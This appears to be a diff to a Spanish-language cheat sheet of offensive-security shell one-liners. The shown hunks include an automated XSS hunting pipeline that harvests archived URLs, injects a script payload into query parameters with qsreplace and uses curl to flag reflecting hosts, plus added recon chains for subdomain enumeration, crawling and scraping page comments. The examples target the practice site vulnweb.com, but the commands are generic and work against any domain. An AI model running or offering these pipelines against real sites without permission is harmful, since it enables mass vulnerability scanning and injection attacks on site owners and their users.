@@ -9,7 +9,7 @@
 
      echo "testphp.vulnweb.com" | waybackurls | anew url1.txt ; cat url1.txt | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js)" | gf xss | qsreplace '"><script>confirm(1)</script>' | anew qsrepl2.json && cat qsrepl2.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss" | tee vuln_xss
 
-#****_Forma rapida de busqueda _XSS_ ======> "echo | way | gf | qsreplace | while | curl | grep |"_****
+#****_Forma rapida de busqueda _XSS_ ======> "echo | way | gf | qsreplace | while | curl | grep"_****
      
      echo "testphp.vulnweb.com" | waybackurls | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss"
               
@@ -271,6 +271,17 @@
     
     #obtener lista de "IP" de un "Rango de Red" o subRed dado con "mapcidr"_****
     echo 44.238.29.244/32 | mapcidr
+
+****_Forma rapida de encontar "dominio" atarves de webspider usando "unfurl -u domains"_****
+
+    echo [+] ejecutando subfinder [+] ; echo "vulnweb.com" | subfinder -silent | anew sub.txt1 ; cat sub.txt1 | httpx -silent | anew http.txt2 ; gospider -S http.txt2 --js -t 50 -d 1 --sitemap --robots -w -r | tail -1000 | anew gos.txt3 ; cat gos.txt3 | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | anew subvalido.txt4
+    
+****_Forma rapida de extraer "comentario interesante de un sitios web"_****
+
+    #time-tool subfinder | cat | fhc | html-tool | anew
+    subfinder -d vulnweb.com -silent | anew sub.txt && cat sub.txt | fhc | html-tool tags title a strong | anew comment.txt
+    subfinder -d vulnweb.com -o s.txt && cat s.txt | fhc | html-tool comments | anew comment.txt
+    cat subreal.txt | fhc | html-tool tags title a strong && find . -type f -name "*.html" | html-tool attribs src href
 
 ****_Forma rapida de encontar vulns con Nuclei usando plantillas de nuclei"_****
 
